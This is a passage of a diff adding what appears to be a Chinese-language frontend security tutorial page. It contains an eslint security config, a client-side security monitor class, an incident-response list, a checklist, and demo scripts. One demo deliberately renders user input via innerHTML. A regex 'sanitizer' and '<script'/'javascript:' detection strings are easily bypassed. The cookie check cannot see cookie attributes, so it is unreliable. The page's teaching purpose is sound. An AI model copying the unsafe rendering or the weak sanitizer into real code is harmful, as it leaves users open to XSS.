+    "security:scan": "npx snyk test && npx dependency-check --project 'Your Project' --scan ./"
+  },
+  "devDependencies": {
+    "eslint-plugin-security": "^1.4.0",
+    "snyk": "^1.785.0",
+    "dependency-check": "^4.1.0"
+  }
+}
+
+// .eslintrc.security.json 配置
+{
+  "plugins": ["security"],
+  "extends": ["plugin:security/recommended"],
+  "rules": {
+    "security/detect-buffer-noassert": "error",
+    "security/detect-child-process": "error",
+    "security/detect-disable-mustache-escape": "error",
+    "security/detect-eval-with-expression": "error",
+    "security/detect-no-csrf-before-method-override": "error",
+    "security/detect-object-injection": ["warn", { "allowProperties": [] }],
+    "security/detect-possible-timing-attacks": "error",
+    "security/detect-pseudoRandomBytes": "error",
+    "security/detect-unsafe-regex": "warn",
+    "security/detect-xss": "error"
+  }
+}</pre>
+            </div>
+            
+            <div class="secure-example">
+                <strong>2. 运行时安全监控</strong>
+                <pre>// 客户端错误和安全异常监控
+class SecurityMonitor {
+    constructor() {
+        this.errors = [];
+        this.setupListeners();
+    }
+    
+    setupListeners() {
+        // 监听JavaScript错误
+        window.addEventListener('error', (event) => {
+            this.logError('JS Error', event.error?.stack || event.message);
+        });
+        
+        // 监听未捕获的Promise拒绝
+        window.addEventListener('unhandledrejection', (event) => {
+            this.logError('Promise Rejection', event.reason?.stack || event.reason);
+        });
+        
+        // 监控CSP违规
+        window.addEventListener('securitypolicyviolation', (event) => {
+            this.logSecurityViolation(event);
+        });
+    }
+    
+    logError(type, message) {
+        const errorData = {
+            type,
+            message,
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+        };
+        
+        this.errors.push(errorData);
+        
+        // 限制错误日志大小
+        if (this.errors.length > 100) {
+            this.errors.shift();
+        }
+        
+        // 发送到服务器（注意不要发送敏感信息）
+        this.sendToServer(errorData);
+    }
+    
+    logSecurityViolation(event) {
+        const violationData = {
+            type: 'CSP Violation',
+            blockedURI: event.blockedURI,
+            violatedDirective: event.violatedDirective,
+            effectiveDirective: event.effectiveDirective,
+            originalPolicy: event.originalPolicy,
+            documentURI: event.documentURI,
+            referrer: event.referrer,
+            timestamp: new Date().toISOString()
+        };
+        
+        // 安全违规可能表示攻击尝试，应优先报告
+        this.sendToServer(violationData, true);
+    }
+    
+    sendToServer(data, isHighPriority = false) {
+        // 避免频繁发送请求
+        const endpoint = isHighPriority ? '/api/security/urgent' : '/api/security/log';
+        
+        // 使用Beacon API减少对用户体验的影响
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(endpoint, JSON.stringify(data));
+        } else {
+            // 降级使用fetch
+            fetch(endpoint, {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                keepalive: true // 允许请求在页面卸载后继续
+            }).catch(err => console.error('无法发送安全日志:', err));
+        }
+    }
+    
+    // 主动检测常见安全问题
+    runSecurityChecks() {
+        // 检测不安全的Cookie设置
+        this.checkCookies();
+        
+        // 检测混合内容
+        this.checkMixedContent();
+        
+        // 检测不安全的API使用
+        this.checkUnsafeAPIs();
+    }
+    
+    checkCookies() {
+        const cookies = document.cookie.split(';');
+        const insecureCookies = [];
+        
+        cookies.forEach(cookie => {
+            const trimmed = cookie.trim();
+            if (trimmed && !trimmed.toLowerCase().includes('httponly') && 
+                !trimmed.toLowerCase().includes('secure') && 
+                !trimmed.toLowerCase().includes('samesite=')) {
+                insecureCookies.push(trimmed.split('=')[0]);
+            }
+        });
+        
+        if (insecureCookies.length > 0) {
+            this.logError('Insecure Cookies', 
+                `发现不安全的Cookie配置: ${insecureCookies.join(', ')}`);
+        }
+    }
+    
+    checkMixedContent() {
+        if (window.location.protocol === 'https:') {
+            // 检查图像资源
+            const images = document.querySelectorAll('img');
+            images.forEach(img => {
+                if (img.src && img.src.startsWith('http:')) {
+                    this.logError('Mixed Content', `发现混合内容图像: ${img.src}`);
+                }
+            });
+            
+            // 检查其他资源...
+        }
+    }
+    
+    checkUnsafeAPIs() {
+        // 检测可能的不安全API使用
+        // 注意：这只是示例，实际实现需要更复杂的方法
+        if (typeof window.eval === 'function') {
+            // 检测eval是否被覆盖或重写
+            // ...
+        }
+    }
+}
+
+// 初始化安全监控
+const securityMonitor = new SecurityMonitor();
+// 定期运行安全检查
+setInterval(() => securityMonitor.runSecurityChecks(), 60000); // 每分钟检查一次</pre>
+            </div>
+            
+            <h3>6.2 安全事件响应流程</h3>
+            
+            <ol>
+                <li><strong>检测与报告</strong>：通过监控系统发现异常行为或安全事件</li>
+                <li><strong>评估与分类</strong>：确定事件的严重性和影响范围</li>
+                <li><strong>遏制与缓解</strong>：采取措施限制损害扩大</li>
+                <li><strong>分析与调查</strong>：确定事件根源和详细情况</li>
+                <li><strong>修复与恢复</strong>：解决安全漏洞并恢复正常运营</li>
+                <li><strong>事后分析</strong>：总结经验教训，更新安全策略</li>
+            </ol>
+            
+            <div class="demo-area">
+                <h4>安全事件模拟</h4>
+                <button id="simulateXSS" class="btn-secondary">模拟XSS攻击</button>
+                <button id="simulateCSRF" class="btn-secondary">模拟CSRF攻击</button>
+                <button id="simulateError" class="btn-secondary">模拟JavaScript错误</button>
+                <div id="securityDemoResult" class="result">安全事件模拟结果将显示在这里...</div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>7. 前端安全最佳实践清单</h2>
+            
+            <div class="security-checklist">
+                <h3>开发阶段安全检查</h3>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>输入验证与清理</strong>
+                        <p>所有用户输入必须经过验证和清理，防止注入攻击</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>安全的DOM操作</strong>
+                        <p>使用安全的DOM操作方法，避免innerHTML等不安全操作</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>避免危险函数</strong>
+                        <p>不使用eval(), new Function(), document.write()等危险函数</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>依赖项安全检查</strong>
+                        <p>定期审计依赖项，确保没有已知漏洞</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>敏感信息处理</strong>
+                        <p>不在前端存储敏感信息，使用HTTPS传输所有数据</p>
+                    </div>
+                </div>
+                
+                <h3>部署阶段安全检查</h3>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>HTTPS配置</strong>
+                        <p>确保站点使用HTTPS，配置合适的TLS版本和密码套件</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>安全响应头</strong>
+                        <p>配置适当的安全响应头（CSP, X-XSS-Protection, X-Frame-Options等）</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>Cookie安全设置</strong>
+                        <p>使用HttpOnly, Secure, SameSite属性保护Cookie</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>资源压缩与混淆</strong>
+                        <p>生产环境中压缩代码，考虑适当的代码混淆</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>移除调试信息</strong>
+                        <p>确保生产环境代码不包含调试信息和控制台日志</p>
+                    </div>
+                </div>
+                
+                <h3>维护阶段安全检查</h3>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>定期安全审计</strong>
+                        <p>定期进行安全审计和漏洞扫描</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>依赖更新策略</strong>
+                        <p>建立依赖项更新机制，及时修复已知漏洞</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>安全监控</strong>
+                        <p>实施安全监控，及时发现和响应安全事件</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>事件响应计划</strong>
+                        <p>制定并演练安全事件响应计划</p>
+                    </div>
+                </div>
+                
+                <div class="checklist-item">
+                    <input type="checkbox">
+                    <div class="item-content">
+                        <strong>安全培训</strong>
+                        <p>定期对开发团队进行安全培训，提高安全意识</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // 选项卡切换功能
+        function switchTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            
+            tabcontent = document.getElementsByClassName("tab-content");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].classList.remove("active");
+            }
+            
+            tablinks = document.getElementsByClassName("tab");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].classList.remove("active");
+            }
+            
+            document.getElementById(tabName).classList.add("active");
+            evt.currentTarget.classList.add("active");
+        }
+        
+        // XSS防护演示功能
+        function testXSSProtection() {
+            const input = document.getElementById('xss-test-input').value;
+            const unsafeResult = document.getElementById('unsafe-result');
+            
+            // 不安全的渲染方式 - 直接使用innerHTML
+            unsafeResult.innerHTML = "不安全渲染结果: " + input;
+            
+            // 警告
+            if (input.includes('<script') || input.includes('javascript:')) {
+                unsafeResult.classList.add('danger-box');
+                unsafeResult.classList.remove('result');
+            } else {
+                unsafeResult.classList.remove('danger-box');
+                unsafeResult.classList.add('result');
+            }
+        }
+        
+        function testSafeRendering() {
+            const input = document.getElementById('xss-test-input').value;
+            const safeResult = document.getElementById('safe-result');
+            
+            // 安全的渲染方式 - 使用textContent
+            safeResult.textContent = "安全渲染结果: " + input;
+            
+            // 模拟DOMPurify的基本清理
+            function simpleSanitize(html) {
+                // 这只是一个简单示例，实际应用应使用专业库如DOMPurify
+                return html
+                    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '[已过滤]')
+                    .replace(/javascript:/gi, '');
+            }
+            
+            // 创建一个额外的div来显示清理后的HTML
+            const sanitizedDiv = document.createElement('div');
+            sanitizedDiv.innerHTML = "清理后的HTML渲染: " + simpleSanitize(input);
+            
+            // 移除之前可能添加的子元素
+            while (safeResult.firstChild) {
+                safeResult.removeChild(safeResult.firstChild);
+            }
+            
+            safeResult.appendChild(document.createTextNode("安全渲染结果: "));
+            safeResult.appendChild(document.createTextNode(input));
+            safeResult.appendChild(document.createElement('br'));
+            safeResult.appendChild(document.createTextNode("清理后的HTML渲染: "));
+            safeResult.appendChild(document.createTextNode(simpleSanitize(input)));
+        }
+        
+        // 安全事件模拟功能
+        function simulateXSSAttack() {
+            const result = document.getElementById('securityDemoResult');
+            result.innerHTML = "模拟XSS攻击检测...\n";
+            
+            setTimeout(() => {
+                result.innerHTML += "⚠️ 检测到可能的XSS攻击尝试\n";
+                result.innerHTML += "攻击向量: script标签注入\n";
+                result.innerHTML += "来源: 用户输入\n";
+                result.innerHTML += "状态: 已阻止\n";
+                result.innerHTML += "详细信息: 输入内容包含<script>标签，已被安全过滤器拦截\n";
+                result.innerHTML += "防护措施: 输入验证和HTML转义已成功应用\n";
+            }, 500);
+        }
+        
+        function simulateCSRFAttack() {
+            const result = document.getElementById('securityDemoResult');
+            result.innerHTML = "模拟CSRF攻击检测...\n";
+            
+            setTimeout(() => {
+                result.innerHTML += "⚠️ 检测到可能的CSRF攻击尝试\n";
+                result.innerHTML += "攻击向量: 跨站表单提交\n";
+                result.innerHTML += "目标: /api/transfer-funds\n";
+                result.innerHTML += "状态: 已阻止\n";
+                result.innerHTML += "详细信息: 请求中缺少有效的CSRF令牌\n";
+                result.innerHTML += "防护措施: CSRF令牌验证已成功阻止未授权请求\n";
+            }, 500);
+        }
+        
+        function simulateJavaScriptError() {
+            const result = document.getElementById('securityDemoResult');
+            result.innerHTML = "模拟JavaScript错误捕获...\n";
+            
+            setTimeout(() => {
+                result.innerHTML += "🔍 检测到JavaScript运行时错误\n";
+                result.innerHTML += "错误类型: ReferenceError\n";
+                result.innerHTML += "错误消息: 'undefinedVariable' is not defined\n";
+                result.innerHTML += "文件: app.js:42\n";
+                result.innerHTML += "状态: 已记录\n";
+                result.innerHTML += "详细信息: 尝试访问未定义变量，可能表示代码缺陷\n";
+                result.innerHTML += "建议: 检查相关代码段，确保变量在使用前已定义\n";
+            }, 500);
+        }
+        
+        // 添加事件监听器
+        document.getElementById('simulateXSS').addEventListener('click', simulateXSSAttack);
+        document.getElementById('simulateCSRF').addEventListener('click', simulateCSRFAttack);
+        document.getElementById('simulateError').addEventListener('click', simulateJavaScriptError);
+    </script>
+</body>
+</html>
